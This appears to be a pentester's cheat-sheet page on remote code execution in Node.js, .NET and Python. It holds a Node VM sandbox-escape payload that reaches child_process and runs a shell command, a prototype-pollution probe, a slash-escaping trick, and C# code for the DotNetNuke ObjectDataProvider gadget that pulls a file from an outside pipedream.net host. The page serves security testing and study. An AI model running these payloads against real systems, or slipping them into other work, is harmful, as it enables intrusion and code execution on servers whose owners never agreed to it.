---
description: Helpful stuff
---

# Remote Code Execution

## Node js

**Bypassing / slashes**

```javascript
\\\\x2f
```

**Get object properties \(can be helpful in debugging\)**

```text
Object.getOwnPropertyNames(
```

**Node VM escape PoC**

```text
this.context.constructor.constructor('return process')().mainModule.require('child_process').exec('touch \\\\x2ftmp\\\\x2f11111')
```

**Proto pollution detection**

```text
{"constructor": {"prototype": {"a0": true}}}
```

## DotNet

For debugging purposes you can use dnSpy.  
IIS process, that is working with your [ASP.Net](http://asp.net/) code is w3wp.exe, so you should use it to attach.   
We then need to access Debug &gt; Windows &gt; Modules to list all the modules loaded by our w3wp.exe process.

What entry points to search for: 

```csharp
Cookies
HttpContext.Current.Request.IsAuthenticated
Request.getParameter
context.User = Thread.CurrentPrincipal
```

How you can fuzz app methods:

\(References **DotNetNuke.dll** and **PresentationFramework.dll**\)

```csharp
using System.IO;
using System.Xml.Serialization;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;

namespace DotNetExploit
{
    class MainClass
    {
        public static void Main(string[] args)
        { 
            Console.WriteLine("Hello World!");
            var myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("<https://enp50ybm0r.x.pipedream.net>");
            myODP.MethodParameters.Add("POC");
            Console.WriteLine("Done!");
        }
    }
}
```

## Python

Look for vulnerable libraries by using snyk.io and ossindex



